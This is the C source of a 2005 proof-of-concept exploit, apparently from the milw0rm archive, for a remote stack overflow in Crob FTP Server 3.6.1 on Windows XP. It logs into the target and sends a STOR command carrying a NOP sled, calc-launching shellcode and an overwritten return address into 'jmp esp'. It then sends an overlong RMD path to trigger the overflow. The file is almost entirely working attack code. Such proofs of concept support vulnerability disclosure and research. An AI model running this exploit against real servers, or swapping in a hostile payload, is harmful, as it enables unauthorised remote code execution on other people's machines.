/*
 * CrobFTP remote stack overflow PoC 
 * ---------------------------------
 * Tested on Crob FTP Server 3.6.1, Windows XP
 * 
 * Coded by Leon Juranic <ljuranic@lss.hr>
 * LSS Security / http://security.lss.hr
 *
 */



#include <stdio.h>
#include <windows.h>
#include <time.h>

#pragma comment (lib,"ws2_32")


char *fzz_recv (int sock)
{
	fd_set fds;
	struct timeval tv;
	static char buf[10000];
	char *ptr=buf;
	int n;
	tv.tv_sec = 5;
	tv.tv_usec = 0;

	FD_ZERO(&fds);
	FD_SET(sock,&fds);
	if (select(NULL,&fds,NULL,NULL,&tv) != 0) {
		if (FD_ISSET (sock,&fds)) n=recv (sock,ptr,sizeof(buf),0);
		buf[n-1] = '\0';
		printf ("RECV: %s\n",buf);
		return buf;
	}
	else {
		return NULL;
	}
	
}
	



int login (int sock, char *user, char *pass)
{
	char buf[1024], *bla;
	bla=fzz_recv(sock);
	printf ("recv: %s\n",bla);
	sprintf (buf,"USER %s\r\n",user);
	send (sock,buf,strlen(buf),0);
	bla=fzz_recv(sock);
	printf ("recv: %s\n",bla);
	sprintf (buf,"PASS %s\r\n",pass);
	send (sock,buf,strlen(buf),0);
	bla=fzz_recv(sock);
	printf ("recv: %s\n",bla);
	if (strcmp("230",bla) != NULL)
		return 0;
	else return -1;
	return 0;
}




void lame_sploit (char *pack, char *user, char *pass)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int sock, err,x;
	struct sockaddr_in sin;
	char buf[2000],tmp[1000];
	

	char *shell=				// 5 min. XP SP1 shellcode
		"\x33\xc0"				// xor eax,eax
		"\x50"					// push eax (\0)
		"\x68\x2e\x65\x78\x65"  // push '.exe'
		"\x68\x63\x61\x6c\x63"  // push 'calc'
		"\x54"					// push esp
		"\xba\x44\x80\xc2\x77"  // mov  edx, 77c28044
		"\xff\xd2";				// call edx  (system)


	wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		printf ("ERROR: Sorry, cannot create socket!!!\n");
		ExitProcess(-1);
	}

	sock=socket(AF_INET,SOCK_STREAM,0);
	

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = inet_addr(pack);
	sin.sin_port = htons(21);
	
	if (connect(sock,(struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
		printf ("CONNECT :(((\n");
		ExitProcess(-1);
	}

	if (login(sock,user,pass) == -1)
	{
		printf ("ERROR: Cannot login to FTP server, sorry!!!\n");
		exit(-1);
	}
	
	memset(tmp,0,sizeof(tmp));
	memset (tmp,0x90,180);


	memcpy (&tmp[80],shell,strlen(shell));
	*(long*)&tmp[158] = 0x77da52b8; // EIP -> ret into 'jmp esp'
	*(long*)&tmp[166] = 0x74ec8390; //		  sub esp,0x74
	*(long*)&tmp[170] = 0x9090e4ff; //		  jmp esp


	_snprintf (buf,sizeof(buf),"STOR %s\r\n", tmp);

	printf ("DEBUG: %.30s %d\n",buf,strlen(buf));
	send (sock,buf,strlen(buf),0);
	printf ("%s\n",fzz_recv(sock));

	strcpy(buf,"RMD ");
	for (x=0;x<276;x++)
		strcat (buf,".../");
	strcat(buf,"\r\n");

	printf ("Sending exploit strings\n");
	send (sock,buf,strlen(buf),0);
	printf ("recv: %s\n",fzz_recv(sock));


}



main (int argc, char **argv)
{
	printf ("CrobFTP Stack overflow PoC \n"
		    "Coded by Leon Juranic <ljuranic@lss.hr>\n"
			"LSS Security / http://security.lss.hr/\n");

	if (argc < 4 ) {
		printf ("\nusage: %s <target_IP> <user> <pass>\n",argv[0]);
		exit(-1);
	}
	lame_sploit(argv[1],argv[2],argv[3]);

}

// milw0rm.com [2005-06-03]
